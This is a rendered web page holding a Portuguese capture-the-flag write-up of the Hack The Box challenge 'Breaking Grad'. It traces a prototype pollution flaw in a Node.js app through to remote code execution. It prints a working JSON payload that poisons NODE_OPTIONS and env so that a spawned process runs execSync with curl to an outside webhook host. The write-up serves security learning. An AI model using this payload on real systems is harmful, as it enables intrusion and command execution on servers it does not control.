@@ -1,0 +1,651 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr"
+    data-theme="dark"
+    data-layout="centered">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  
+  <meta name="generator" content="Hugo 0.168.0">
+  <meta name="generator-theme" content="Book Theme: https://github.com/alex-shpak/hugo-book">
+
+
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Breaking GradBreaking gradBreaking grad é uma challenge medium, da categoria web do hackthe box​
+Baixei o código fonte da aplicação, mas antes disso, vamos dar uma olhada na página web:Basicamente temos uma view com uma única ação, onde enviamos um nome via json e recebemos uma resposta se passamos ou não:
+Tentei mudar o nome para nomes aleatórios, como “Portas”, “”, “teste”, e todos retornam o mesmo response Vamos olhar o código fonte então:​Temos uma aplicação NodeJS em um container, e a flag com um nome aleatório na raíz, nada demais na configuração do container:
+">
+<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
+<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#2e3440">
+<meta name="color-scheme" content="light dark">
+<meta name="format-detection" content="telephone=no"><meta property="og:url" content="http://localhost:1313/docs/ctf/hack-the-box/challenges-web/breaking-grad/">
+	<meta property="og:site_name" content="Portas">
+	<meta property="og:title" content="Portas">
+	<meta property="og:description" content="Breaking GradBreaking gradBreaking grad é uma challenge medium, da categoria web do hackthe box​
+Baixei o código fonte da aplicação, mas antes disso, vamos dar uma olhada na página web:Basicamente temos uma view com uma única ação, onde enviamos um nome via json e recebemos uma resposta se passamos ou não:
+Tentei mudar o nome para nomes aleatórios, como “Portas”, “”, “teste”, e todos retornam o mesmo response Vamos olhar o código fonte então:​Temos uma aplicação NodeJS em um container, e a flag com um nome aleatório na raíz, nada demais na configuração do container:">
+	<meta property="og:locale" content="en_us">
+	<meta property="og:type" content="article">
+		<meta property="article:section" content="docs">
+
+
+	<meta itemprop="name" content="Portas">
+	<meta itemprop="description" content="Breaking GradBreaking gradBreaking grad é uma challenge medium, da categoria web do hackthe box​
+Baixei o código fonte da aplicação, mas antes disso, vamos dar uma olhada na página web:Basicamente temos uma view com uma única ação, onde enviamos um nome via json e recebemos uma resposta se passamos ou não:
+Tentei mudar o nome para nomes aleatórios, como “Portas”, “”, “teste”, e todos retornam o mesmo response Vamos olhar o código fonte então:​Temos uma aplicação NodeJS em um container, e a flag com um nome aleatório na raíz, nada demais na configuração do container:">
+	<meta itemprop="wordCount" content="716">
+
+<title>Breaking Grad • Portas</title>
+<link rel="icon" href="/favicon.svg" type="image/svg+xml">
+<link rel="icon" href="/favicon.png" sizes="any">
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+
+<link rel="manifest" href="/manifest.json">
+<link rel="canonical" href="http://localhost:1313/docs/ctf/hack-the-box/challenges-web/breaking-grad/">
+<link rel="stylesheet" href="/book.min.d2a63061af208ea46d4a5088bdb2c8d297df14bbb9064b630ae0b63dcb664760.css" integrity="sha256-0qYwYa8gjqRtSlCIvbLI0pffFLu5BktjCuC2PctmR2A=" crossorigin="anonymous">
+
+
+<script type="module" src="/en.search.min.5d7d2e44f776c41b94da5c54f7df9ffe0ff698ce88fe3f1b3bd9e7b1f82ccae2.js" integrity="sha256-XX0uRPd2xBuU2lxU99&#43;f/g/2mM6I/j8bO9nnsfgsyuI=" crossorigin="anonymous"></script>
+  
+</head>
+
+<body dir="ltr" class="book-kind-page book-type-docs">
+  <div class="book-container flex">
+    
+<aside class="book-menu" aria-label="Menu">
+  <div class="book-menu-content">
+    
+  <nav>
+<div class="book-brand">
+  <a class="flex align-center" href="/"><span>Portas</span>
+  </a>
+</div>
+
+<div class="book-search hidden">
+  <input id="book-search-input" type="text" role="searchbox" enterkeyhint="search"
+    placeholder="Search"
+    aria-label="Search"
+    maxlength="64" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results" aria-live="polite"></ul>
+</div>
+<script>document.querySelector(".book-search").classList.remove("hidden")</script>
+
+
+
+
+
+
+
+
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-fd1b80fe704649033173072830dbda4c" class="toggle"  />
+    <label for="section-fd1b80fe704649033173072830dbda4c" class="flex">
+      <a role="button" class="">
+        Offensive Security</a>
+      <svg class="book-icon" aria-hidden="true"><use href="/iconset.min.90a7fd302dc1b9bc3c291688faee66a3e60a9209f59b89fa00669e35d6907b3f.svg#chevron-right"></use></svg>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-b78b49e6983b03c601585815216f03c4" class="toggle"  />
+    <label for="section-b78b49e6983b03c601585815216f03c4" class="flex">
+      <a role="button" class="">
+        Initial Access</a>
+      <svg class="book-icon" aria-hidden="true"><use href="/iconset.min.90a7fd302dc1b9bc3c291688faee66a3e60a9209f59b89fa00669e35d6907b3f.svg#chevron-right"></use></svg>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/offsensive-security/inital-access/remote-template-injection/" class="">
+      Remote Template Injection</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-6652e0280f4a0b30fa40b02437030f68" class="toggle" checked />
+    <label for="section-6652e0280f4a0b30fa40b02437030f68" class="flex">
+      <a role="button" class="">
+        CTF</a>
+      <svg class="book-icon" aria-hidden="true"><use href="/iconset.min.90a7fd302dc1b9bc3c291688faee66a3e60a9209f59b89fa00669e35d6907b3f.svg#chevron-right"></use></svg>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-58e18b116dcb674821e213ec0945416f" class="toggle" checked />
+    <label for="section-58e18b116dcb674821e213ec0945416f" class="flex">
+      <a role="button" class="">
+        Hack the Box</a>
+      <svg class="book-icon" aria-hidden="true"><use href="/iconset.min.90a7fd302dc1b9bc3c291688faee66a3e60a9209f59b89fa00669e35d6907b3f.svg#chevron-right"></use></svg>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-494dc92d9104717a20a45ff4de94fed4" class="toggle" checked />
+    <label for="section-494dc92d9104717a20a45ff4de94fed4" class="flex">
+      <a role="button" class="">
+        Challenges (web)</a>
+      <svg class="book-icon" aria-hidden="true"><use href="/iconset.min.90a7fd302dc1b9bc3c291688faee66a3e60a9209f59b89fa00669e35d6907b3f.svg#chevron-right"></use></svg>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ctf/hack-the-box/challenges-web/breaking-grad/" class="active">
+      Breaking Grad</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ctf/hack-the-box/challenges-web/jerrytok/" class="">
+      Jerrytok</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ctf/hack-the-box/challenges-web/templated/" class="">
+      Templated</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ctf/hack-the-box/challenges-web/toxic/" class="">
+      Toxic</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-b358f1a871f27b6123c59716f1b3428c" class="toggle"  />
+    <label for="section-b358f1a871f27b6123c59716f1b3428c" class="flex">
+      <a role="button" class="">
+        Machines</a>
+      <svg class="book-icon" aria-hidden="true"><use href="/iconset.min.90a7fd302dc1b9bc3c291688faee66a3e60a9209f59b89fa00669e35d6907b3f.svg#chevron-right"></use></svg>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ctf/hack-the-box/machines/blurry/" class="">
+      Blurry</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ctf/hack-the-box/machines/certified/" class="">
+      Certified</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ctf/hack-the-box/machines/cicada/" class="">
+      Cicada</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ctf/hack-the-box/machines/monitorsthree/" class="">
+      Monitorsthree</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-c7059daadfdbaf53fa1366c3499caad7" class="toggle"  />
+    <label for="section-c7059daadfdbaf53fa1366c3499caad7" class="flex">
+      <a role="button" class="">
+        Juice Shop</a>
+      <svg class="book-icon" aria-hidden="true"><use href="/iconset.min.90a7fd302dc1b9bc3c291688faee66a3e60a9209f59b89fa00669e35d6907b3f.svg#chevron-right"></use></svg>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ctf/juice-shop/cross-site-scriping/" class="">
+      Cross Site Scriping</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ctf/juice-shop/injection/" class="">
+      Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ctf/juice-shop/readme/" class="">
+      Readme</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</nav>
+
+
+
+
+  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+
+  </div>
+</aside>
+ 
+
+    <header class="book-header hidden">
+      
+  <div class="flex align-center justify-between gap">
+  <input type="checkbox" class="toggle" id="menu-control" />
+  <label for="menu-control" aria-label="Menu">
+    <svg class="book-icon"><use href="/iconset.min.90a7fd302dc1b9bc3c291688faee66a3e60a9209f59b89fa00669e35d6907b3f.svg#menu"></use></svg>
+  </label>
+
+  <div class="book-brand">
+  <a class="flex align-center" href="/"><span>Portas</span>
+  </a>
+</div>
+
+
+  
+  <input type="checkbox" class="toggle" id="toc-control" />
+  <label for="toc-control" aria-label="Table of Contents">
+    <svg class="book-icon"><use href="/iconset.min.90a7fd302dc1b9bc3c291688faee66a3e60a9209f59b89fa00669e35d6907b3f.svg#toc"></use></svg>
+  </label>
+  
+</div>
+
+ 
+    </header>
+
+    <main class="book-page">
+      
+      
+  
+
+      
+  <article class="markdown book-article"><h1 id="breaking-grad">Breaking Grad<a class="anchor" href="#breaking-grad" aria-label="Link"></a></h1>
+<h2 id="breaking-grad-1">Breaking grad<a class="anchor" href="#breaking-grad-1" aria-label="Link"></a></h2>
+<p>Breaking grad é uma challenge medium, da categoria web do hackthe box​</p>
+<figure><img src="https://2029472614-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FdgOCY5orlofjVPTdN1Di%2Fuploads%2F4epNcx4KCae7WBP4ttm0%2Fimage.png?alt=media&#x26;token=ab3c340c-5e34-458b-9d4a-605c73808e42" alt=""><figcaption></figcaption></figure>
+<p>Baixei o código fonte da aplicação, mas antes disso, vamos dar uma olhada na página web:Basicamente temos uma view com uma única ação, onde enviamos um nome via json e recebemos uma resposta se passamos ou não:</p>
+<figure><img src="https://2029472614-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FdgOCY5orlofjVPTdN1Di%2Fuploads%2FZey9J6vCtRMV0e2MgDUn%2Fimage.png?alt=media&#x26;token=2db384b6-c280-4f20-a209-69e2e7e1cee0" alt=""><figcaption></figcaption></figure>
+<p>Tentei mudar o nome para nomes aleatórios, como &ldquo;Portas&rdquo;, &ldquo;&rdquo;, &ldquo;teste&rdquo;, e todos retornam o mesmo response Vamos olhar o código fonte então:​Temos uma aplicação NodeJS em um container, e a flag com um nome aleatório na raíz, nada demais na configuração do container:</p>
+<figure><img src="https://2029472614-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FdgOCY5orlofjVPTdN1Di%2Fuploads%2FkyOmJgAPjkFpTJCve0Mf%2Fimage.png?alt=media&#x26;token=231b1626-fa33-4c21-a1d7-6b2775dee125" alt=""><figcaption></figcaption></figure>
+<p>Vamos olhar então o index.js em routes, que tem os endpoints da aplicação e podemos ver quais ações podemos fazer no app </p>
+<p>Podemos ver aqui as rotas e como elas executam as nossas requisições, inclusive a requisção principal do site, em /api/calculate​</p>
+<figure><img src="https://2029472614-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FdgOCY5orlofjVPTdN1Di%2Fuploads%2Ft5KFCZAY226Zjln2IQ1J%2Fimage.png?alt=media&#x26;token=0f9fc646-cafe-498d-a8d7-ad54dcaac8ba" alt=""><figcaption></figcaption></figure>
+<p>Uma rota que me chamou atenção foi a /debug/:action/ vamos ver o que essa função DebugHelper.execute faz:</p>
+<figure><img src="https://2029472614-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FdgOCY5orlofjVPTdN1Di%2Fuploads%2F0I4HSUUX9pp6PURIGwAh%2Fimage.png?alt=media&#x26;token=49bbaaa2-834e-4845-92cb-98d36ad5c1e5" alt=""><figcaption></figcaption></figure>
+<p>Basicamente, a função verifica qual comando foi escolhido (version/ram), e dependendo de qual comando for, abre um processo no sistema operacional e executa um comando pré definido, seria o alvo perfeito para um RCE ou command injection, mas não temos controle sobre nenhum parâmetro da execução do processo, então sem problema de segurança aqui😢</p>
+<p>Vamos olhar a rota api/calculate, como ela define se passamos ou não no exame, começando pelas funções de studentHelper</p>
+<figure><img src="https://2029472614-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FdgOCY5orlofjVPTdN1Di%2Fuploads%2FbLOsrkteX6qclB8pgh1Y%2Fimage.png?alt=media&#x26;token=f086de75-e7fa-49b8-b137-02f04769381f" alt=""><figcaption></figcaption></figure>
+<p>Basicamente verifica por nomes e se a grade é maior ou igual a 10, nesse `if` aqui:</p>
+<figure><img src="https://2029472614-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FdgOCY5orlofjVPTdN1Di%2Fuploads%2FccZ5iUlzXV8csGbIO5xq%2Fimage.png?alt=media&#x26;token=b57259c2-7f1e-4568-af12-0161874a3677" alt=""><figcaption></figcaption></figure>
+<p>Então, se enviarmos um nome que não tenha Baker ou Purvis, e um &ldquo;paper&rdquo; maior ou igual a 10, a resposta será que passamos, como vemos aqui:</p>
+<figure><img src="https://2029472614-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FdgOCY5orlofjVPTdN1Di%2Fuploads%2FmFVSNP3zdST7p2zFx5zb%2Fimage.png?alt=media&#x26;token=94bcbb91-9f8b-4009-9f39-d44040e9be5a" alt=""><figcaption></figcaption></figure>
+<p>​Mas ainda nenhum problema de segurança grave aqui, vamos olhar em ObjectHelper.clone:</p>
+<h2 id="prototype-pollution">Prototype Pollution<a class="anchor" href="#prototype-pollution" aria-label="Link"></a></h2>
+<figure><img src="https://2029472614-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FdgOCY5orlofjVPTdN1Di%2Fuploads%2F01mGkTMIqYCm4hioQjby%2Fimage.png?alt=media&#x26;token=0a818c4f-7fef-4886-a08f-17088a22ec32" alt=""><figcaption></figcaption></figure>
+<p>Essa função faz um merge de um objeto passado por parâmetro para outro, copiando todas as chaves e valores, porém o objeto copiado é um objeto controlado pelo atacante, então temos um possível Prototype Pollution aqui!! Porém a aplicação implementou um mecanismo de segurança contra esse ataque, validando as chaves e removendo os &ldquo;__proto__&rdquo;.</p>
+<p>Prototype pollution não é uma vulnerabilidade que tenho muito conhecimento, então li esses 3 links para entender melhor como funciona e como posso explorar:</p>
+<ul>
+<li>​<a href="https://portswigger.net/web-security/prototype-pollution">https://portswigger.net/web-security/prototype-pollution</a>​</li>
+<li><a href="https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution#proto-pollution-to-rce">https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution#proto-pollution-to-rce</a>​</li>
+<li>​<a href="https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce">https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce</a>​</li>
+</ul>
+<p>Com esse entendimento melhor sobre a vulnerabilidade, vi que existem outras formas de sobrescrever uma propriedade, sem ser usando o __proto__, podemos sobrescrever o objeto global Object.prototype.SomeThing, que fará com que todos os objetos possuam o atributo &ldquo;SomeThing&rdquo;</p>
+<p>Para validar essa ideia, eu pensei que se eu pudesse adicionar um atributo &ldquo;paper = 10&rdquo; em todos os objetos, e fizer um post para /api/calculate, sem passar o valor de paper, a resposta irá ser &ldquo;Passed&rdquo;, já que esse objeto student vai herdar o &ldquo;paper&rdquo; de object.prototype.paper, que podemos sobrescrever, usei como referência esse link: <a href="https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce#poisoning-constructor.prototype">https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce#poisoning-constructor.prototype</a></p>
+<p>aqui temos os testes:</p>
+<figure><img src="https://2029472614-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FdgOCY5orlofjVPTdN1Di%2Fuploads%2F6niaWGP0mIKcU09mpOXH%2Fimage.png?alt=media&#x26;token=a4c5defc-9153-4baf-b7ff-5c67616b7e59" alt=""><figcaption></figcaption></figure>
+<figure><img src="https://2029472614-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FdgOCY5orlofjVPTdN1Di%2Fuploads%2FuknnRNcYOGvU0Sycttf8%2Fimage.png?alt=media&#x26;token=ffdea90d-a56b-4dcc-b8e8-fc3c6ea87801" alt=""><figcaption></figcaption></figure>
+<p>E funcionou!! Passamos um student sem o atributo paper, e mesmo assim o resultado foi &ldquo;Passed&rdquo;, pois agora conseguimos criar ou sobrescrever métodos e atributos globalmente!</p>
+<p>Agora tenho duas hipóteses em mente:</p>
+<ul>
+<li>
+<p>Usar alguma payload de RCE para conseguir alguma reverse shell e ler a flag</p>
+</li>
+<li>
+<p>Achar algum atributo ou método do objeto Response do express para criar ou sobrescrever, já que esse objeto é usado em um processo do sistema, e talvez consiga algum RCE com isso:​</p>
+<figure><img src="https://2029472614-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FdgOCY5orlofjVPTdN1Di%2Fuploads%2FjrGmGK0OnFDAkp24TZiS%2Fimage.png?alt=media&#x26;token=36af0f2a-479e-43f7-abef-b83271308d86" alt=""><figcaption></figcaption></figure>
+</li>
+</ul>
+<h3 id="rce">RCE<a class="anchor" href="#rce" aria-label="Link"></a></h3>
+<p>​A primeira ideia parece menos complexa, então vou tentar ela primeiro, lendo algumas referências sobre RCE com prototype pollution, podemos fazer um poisoning na variável env quando o node abre um processo no sistema operacional, que é exatamente o que temos no debug!<br>
+<br>
+Então podemos fazer o seguinte, coloquei a seguinte payload no post request</p>
+<p>{% code title=&quot;&quot; overflow=&ldquo;wrap&rdquo; lineNumbers=&ldquo;true&rdquo; %}</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;constructor&#34;</span>: {<span style="color:#f92672">&#34;prototype&#34;</span>: {<span style="color:#f92672">&#34;NODE_OPTIONS&#34;</span>: <span style="color:#e6db74">&#34;--require /proc/self/environ&#34;</span>, <span style="color:#f92672">&#34;env&#34;</span>: { <span style="color:#f92672">&#34;EVIL&#34;</span>:<span style="color:#e6db74">&#34;console.log(require(&#39;child_process&#39;).execSync(&#39;curl https://webhook.site/8eb75854-a0fe-475f-8f26-1f0b8c184f1e&#39;).toString())//&#34;</span>}}</span></span></code></pre></div><p>{% endcode %}</p>
+<p>E entrando em /debug/version (para ativar o process que envenenamos via env) , recebo como response `curl: not found`</p>
+<p>Isso quer dizer que conseguimos um RCE, mas o binário curl não existe no sistema operacional, mas tendo o RCE podemos pegar a flag!<br>
+<br></p>
+<figure><img src="/assets/image%20%2884%29.png">
+</figure>
+
+<figure><img src="/assets/image%20%2882%29.png">
+</figure>
+
+<figure><img src="/assets/image%20%2885%29.png">
+</figure>
+
+<figure><img src="/assets/image%20%2881%29.png">
+</figure>
+
+<p>Achei o desafio bem legal, achei mais fácil do que médium como está descrito. Depois que percebemos a possibilidade do prototype pollution, as pesquisas que fazemos sobre essa falha retornam ótimos materiais para aprendermos como se explora ela e a partir daí não é tão difícil aplicar no desafio, mas é bem divertido de fazer!</p>
+</article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+<div>
+
+</div>
+
+<div>
+
+</div>
+
+</div>
+
+<div class="flex flex-wrap justify-between">
+    <span>
+    
+      <a href="/docs/offsensive-security/inital-access/remote-template-injection/" class="flex align-center">
+        <svg class="book-icon" aria-hidden="true"><use href="/iconset.min.90a7fd302dc1b9bc3c291688faee66a3e60a9209f59b89fa00669e35d6907b3f.svg#backward"></use></svg>
+        <span>Remote Template Injection</span>
+      </a>
+    
+    </span>
+    <span>
+    
+      <a href="/docs/ctf/hack-the-box/challenges-web/jerrytok/" class="flex align-center">
+        <span>Jerrytok</span>
+        <svg class="book-icon" aria-hidden="true"><use href="/iconset.min.90a7fd302dc1b9bc3c291688faee66a3e60a9209f59b89fa00669e35d6907b3f.svg#forward"></use></svg>
+      </a>
+    
+    </span>
+  </div>
+
+ 
+        
+  
+ 
+        
+        
+  
+ 
+        
+  
+    <script>(function(){document.querySelectorAll("pre:has(code)").forEach(e=>{e.addEventListener("click",e.focus),e.addEventListener("copy",function(t){if(t.preventDefault(),navigator.clipboard){const t=window.getSelection().toString()||e.textContent;navigator.clipboard.writeText(t)}})})})()</script>
+  
+
+      </footer>
+
+      <label for="menu-control" class="hidden book-menu-overlay" aria-hidden="true"></label>
+    </main>
+
+    
+  
+  <aside class="book-toc" aria-label="Table of Contents">
+    <div class="book-toc-content">
+      
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#breaking-grad-1">Breaking grad</a></li>
+    <li><a href="#prototype-pollution">Prototype Pollution</a>
+      <ul>
+        <li><a href="#rce">RCE</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+
+
+
+
+
+    </div>
+  </aside>
+  
+ 
+  </div>
+
+  
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
